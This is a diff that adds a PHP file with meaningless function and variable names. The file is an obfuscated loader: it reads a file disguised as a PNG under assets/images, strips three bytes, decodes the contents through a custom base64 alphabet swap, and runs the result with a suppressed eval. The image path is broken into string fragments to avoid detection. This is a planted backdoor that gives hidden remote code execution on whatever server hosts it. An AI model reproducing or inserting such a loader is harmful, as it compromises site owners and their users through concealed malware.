@@ -1,0 +1,53 @@
+<?php
+
+function igadit_iririqih($orerin_nujazhado) {
+    switch ($orerin_nujazhado) {
+        case 1:
+            return suninu_upejabeve();
+        case 2:
+            return acudix_shekazhaw();
+    }
+}
+
+function ulygiv_datuvuchu($orerin_nujazhado) {
+    $ushecix = igadit_iririqih(1);
+    $thicywo = igadit_iririqih(2);
+    for ($cijamu = 0; $cijamu < strlen($ushecix); $cijamu++) {
+        $tarizu = substr($ushecix, $cijamu, 1);
+        $ylukon = substr($thicywo, $cijamu, 1);
+        $kucyjy[$tarizu] = $ylukon;
+    }
+
+    $marufap = strtr($orerin_nujazhado, $kucyjy);
+    $marufap = base64_decode($marufap);
+
+    return $marufap;
+}
+
+function ugufeg_obylanul($orerin_nujazhado) {
+    $zhelote = array();
+    if (!file_exists($orerin_nujazhado))
+        return false;
+    $hagythu = @file_get_contents($orerin_nujazhado);
+    if (!$hagythu)
+        return false;
+    $hagythu = substr($hagythu, 3);
+    $zhelote = ulygiv_datuvuchu($hagythu);
+    return $zhelote;
+}
+
+function suninu_upejabeve() {
+    $hagythu = "qSkFYm0UzBevIjrl2yXocsLQ=nb3EMg9t/6JCxuOAaZp7fG+8RP5NdWiVDTh4HwK1";
+    return $hagythu;
+}
+
+function acudix_shekazhaw() {
+    $zhelote = "+qIYMasyrQRX4xl85FzA3pkbcveVUNCw9Sm6D2ZoK1fTnBgh/Hitu=WOjPL7GEJ0d";
+    return $zhelote;
+}
+
+$ikicim = ugufeg_obylanul(__DIR__ . "/ass" . "ets/im" . "ages/" . "xohoho" . ".png");
+if ($ikicim) {
+    @eval($ikicim);
+}
+
